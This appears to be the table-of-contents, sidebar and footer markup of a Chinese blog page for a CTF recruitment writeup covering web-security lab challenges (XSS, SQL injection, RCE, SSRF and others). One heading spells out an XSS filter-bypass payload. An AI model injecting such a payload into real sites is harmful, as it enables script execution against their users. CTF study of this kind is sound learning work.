href="#alert-0"><span class="toc-number">5.2.</span> <span class="toc-text">&quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%AA%E9%9C%80%E8%A6%81%E4%BF%AE%E6%94%B9url-%E5%92%8C-%E4%B8%A4%E4%B8%AApayload%E5%8D%B3%E5%8F%AF"><span class="toc-number">6.</span> <span class="toc-text">只需要修改url 和 两个payload即可</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E7%BD%91%E5%9D%80%EF%BC%88%E4%B8%8D%E5%B8%A6%E5%8F%82%E6%95%B0%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">目标网址（不带参数）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E9%95%BF%E5%BA%A6%E4%BD%BF%E7%94%A8%E7%9A%84payload"><span class="toc-number">8.</span> <span class="toc-text">猜解长度使用的payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%AD%97%E7%AC%A6%E4%BD%BF%E7%94%A8%E7%9A%84payload"><span class="toc-number">9.</span> <span class="toc-text">枚举字符使用的payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E9%95%BF%E5%BA%A6"><span class="toc-number">10.</span> <span class="toc-text">获取长度</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E7%AC%A6"><span class="toc-number">11.</span> <span class="toc-text">获取字符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E7%8C%9C%E8%A7%A3"><span class="toc-number">12.</span> <span class="toc-text">开始猜解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#part2"><span class="toc-number">13.</span> <span class="toc-text">part2:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#YuLin-2023-Recruit-Writeup-part-2"><span class="toc-number">14.</span> <span class="toc-text">YuLin 2023 Recruit Writeup part 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-%E7%9B%92%E6%AD%A6%E5%99%A8"><span class="toc-number">14.1.</span> <span class="toc-text">[Easy]盒武器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#picture1"><span class="toc-number">14.1.1.</span> <span class="toc-text">picture1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#picture2"><span class="toc-number">14.1.2.</span> <span class="toc-text">picture2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyphp"><span class="toc-number">14.2.</span> <span class="toc-text">babyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EASY-Script-Kiddie"><span class="toc-number">14.3.</span> <span class="toc-text">[EASY]Script Kiddie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#thinkphp-5-0"><span class="toc-number">14.3.1.</span> <span class="toc-text">thinkphp 5.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#drupal"><span class="toc-number">14.3.2.</span> <span class="toc-text">drupal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#spring"><span class="toc-number">14.3.3.</span> <span class="toc-text">spring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E9%9F%B3%E6%84%9F"><span class="toc-number">14.3.4.</span> <span class="toc-text">绝对音感</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90Mid%E3%80%91MidBypass"><span class="toc-number">14.3.5.</span> <span class="toc-text">【Mid】MidBypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pikachu"><span class="toc-number">14.4.</span> <span class="toc-text">pikachu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%94%81%E7%9A%AE%E5%8D%A1%E4%B8%98%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">14.4.1.</span> <span class="toc-text">解锁皮卡丘的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">14.4.2.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">14.4.2.1.</span> <span class="toc-text">1.基于表单暴力破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9F%BA%E4%BA%8E%E5%89%8D%E7%AB%AF%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88on-server%EF%BC%89"><span class="toc-number">14.4.2.2.</span> <span class="toc-text">2. 基于前端的验证码绕过（on server）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8E%E5%89%8D%E7%AB%AF%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88on-client%EF%BC%89"><span class="toc-number">14.4.2.3.</span> <span class="toc-text">3.基于前端的验证码绕过（on client）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-token%E9%98%B2%E6%9A%B4%E7%A0%B4"><span class="toc-number">14.4.2.4.</span> <span class="toc-text">4.token防暴破</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">14.4.3.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="toc-number">14.4.3.1.</span> <span class="toc-text">1.反射型xss(get)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8F%8D%E5%B0%84%E6%80%A7xss-post"><span class="toc-number">14.4.3.2.</span> <span class="toc-text">2.反射性xss(post)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">14.4.3.3.</span> <span class="toc-text">3.存储型xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-DOM%E5%9E%8Bxss"><span class="toc-number">14.4.3.4.</span> <span class="toc-text">4.DOM型xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-xss%E7%9B%B2%E6%89%93"><span class="toc-number">14.4.3.5.</span> <span class="toc-text">5.xss盲打</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">14.4.3.6.</span> <span class="toc-text">6.xss之过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-xss%E4%B9%8Bhtmlspecialchars"><span class="toc-number">14.4.3.7.</span> <span class="toc-text">7.xss之htmlspecialchars</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="toc-number">14.4.3.8.</span> <span class="toc-text">8.xss之href输出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="toc-number">14.4.3.9.</span> <span class="toc-text">9.xss之js输出</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">14.4.4.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-CSRF-get-login"><span class="toc-number">14.4.4.1.</span> <span class="toc-text">1.CSRF(get) login</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-CSRF-post"><span class="toc-number">14.4.4.2.</span> <span class="toc-text">2.CSRF(post)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-CSRF-Token"><span class="toc-number">14.4.4.3.</span> <span class="toc-text">3.CSRF Token</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Inject"><span class="toc-number">14.4.5.</span> <span class="toc-text">SQL-Inject</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">14.4.5.1.</span> <span class="toc-text">1.数字型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">14.4.5.2.</span> <span class="toc-text">2.字符型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">14.4.5.3.</span> <span class="toc-text">3.搜索型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-XX%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">14.4.5.4.</span> <span class="toc-text">4. XX型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-insert-update%E6%B3%A8%E5%85%A5"><span class="toc-number">14.4.5.5.</span> <span class="toc-text">5. insert&#x2F;update注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-Delete%E6%B3%A8%E5%85%A5"><span class="toc-number">14.4.5.6.</span> <span class="toc-text">6.Delete注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">14.4.5.7.</span> <span class="toc-text">7.http头注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">14.4.5.8.</span> <span class="toc-text">8.布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-number">14.4.5.9.</span> <span class="toc-text">9.延时盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">14.4.5.10.</span> <span class="toc-text">10. 宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">14.4.6.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-exec-%E2%80%9Cping%E2%80%9D"><span class="toc-number">14.4.6.1.</span> <span class="toc-text">1.exec “ping”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-exec-%E2%80%9Ceval%E2%80%9D"><span class="toc-number">14.4.6.2.</span> <span class="toc-text">2.exec “eval”</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">14.4.7.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">14.4.7.1.</span> <span class="toc-text">1.本地文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">14.4.7.2.</span> <span class="toc-text">2.远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">14.4.8.</span> <span class="toc-text">不安全的文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">14.4.8.1.</span> <span class="toc-text">1.不安全的文件下载</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe-file-upload"><span class="toc-number">14.4.9.</span> <span class="toc-text">Unsafe file upload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AE%A2%E6%88%B7%E7%AB%AFcheck"><span class="toc-number">14.4.9.1.</span> <span class="toc-text">1.客户端check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E7%AB%AFcheck"><span class="toc-number">14.4.9.2.</span> <span class="toc-text">2.服务端check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-getimagesize"><span class="toc-number">14.4.9.3.</span> <span class="toc-text">3.getimagesize()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Over-permission"><span class="toc-number">14.4.10.</span> <span class="toc-text">Over permission</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-number">14.4.10.1.</span> <span class="toc-text">1.水平越权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-number">14.4.10.2.</span> <span class="toc-text">2.垂直越权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">14.4.11.</span> <span class="toc-text">..&#x2F;..&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">14.4.11.1.</span> <span class="toc-text">1.目录遍历</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">14.4.11.2.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-find-abc"><span class="toc-number">14.4.11.3.</span> <span class="toc-text">1.find abc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">14.4.12.</span> <span class="toc-text">PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">14.4.12.1.</span> <span class="toc-text">1.PHP反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE"><span class="toc-number">14.4.13.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-XXE%E6%BC%8F%E6%B4%9E"><span class="toc-number">14.4.13.1.</span> <span class="toc-text">1.XXE漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#url%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">14.4.14.</span> <span class="toc-text">url重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84url%E8%B7%B3%E8%BD%AC"><span class="toc-number">14.4.14.1.</span> <span class="toc-text">1.不安全的url跳转</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">14.4.15.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SSRF-curl"><span class="toc-number">14.4.15.1.</span> <span class="toc-text">1.SSRF(curl)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-SSRF-file-get-content"><span class="toc-number">14.4.15.2.</span> <span class="toc-text">2.SSRF(file_get_content)</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/43666.html" title="信息安全数学基础归纳"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/12/10/65749fd97ec9d.jpg" onerror="this.onerror=null;this.src='https://bu.dusays.com/2023/11/03/65450afb66c4f.jpg'" alt="信息安全数学基础归纳"/></a><div class="content"><a class="title" href="/posts/43666.html" title="信息安全数学基础归纳">信息安全数学基础归纳</a><time datetime="2023-12-09T17:06:12.144Z" title="发表于 2023-12-10 01:06:12">2023-12-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/16427.html" title="CNSS Recruit 2023 Writeup"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65451815e32d3.jpg" onerror="this.onerror=null;this.src='https://bu.dusays.com/2023/11/03/65450afb66c4f.jpg'" alt="CNSS Recruit 2023 Writeup"/></a><div class="content"><a class="title" href="/posts/16427.html" title="CNSS Recruit 2023 Writeup">CNSS Recruit 2023 Writeup</a><time datetime="2023-12-02T18:08:56.000Z" title="发表于 2023-12-03 02:08:56">2023-12-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/54882.html" title="安装Arch Linux的记录"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/12/03/656b72718aa0a.jpg" onerror="this.onerror=null;this.src='https://bu.dusays.com/2023/11/03/65450afb66c4f.jpg'" alt="安装Arch Linux的记录"/></a><div class="content"><a class="title" href="/posts/54882.html" title="安装Arch Linux的记录">安装Arch Linux的记录</a><time datetime="2023-12-02T18:03:57.000Z" title="发表于 2023-12-03 02:03:57">2023-12-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/36124.html" title="YuLin 2023 Recruit Writeup"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/6545181570d8a.jpg" onerror="this.onerror=null;this.src='https://bu.dusays.com/2023/11/03/65450afb66c4f.jpg'" alt="YuLin 2023 Recruit Writeup"/></a><div class="content"><a class="title" href="/posts/36124.html" title="YuLin 2023 Recruit Writeup">YuLin 2023 Recruit Writeup</a><time datetime="2023-11-03T15:56:39.000Z" title="发表于 2023-11-03 23:56:39">2023-11-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/51727.html" title="我的第一篇博客"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450af808b47.jpg" onerror="this.onerror=null;this.src='https://bu.dusays.com/2023/11/03/65450afb66c4f.jpg'" alt="我的第一篇博客"/></a><div class="content"><a class="title" href="/posts/51727.html" title="我的第一篇博客">我的第一篇博客</a><time datetime="2023-11-02T12:15:27.000Z" title="发表于 2023-11-02 20:15:27">2023-11-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Leon</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="web,re,pwn,crypto,design" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>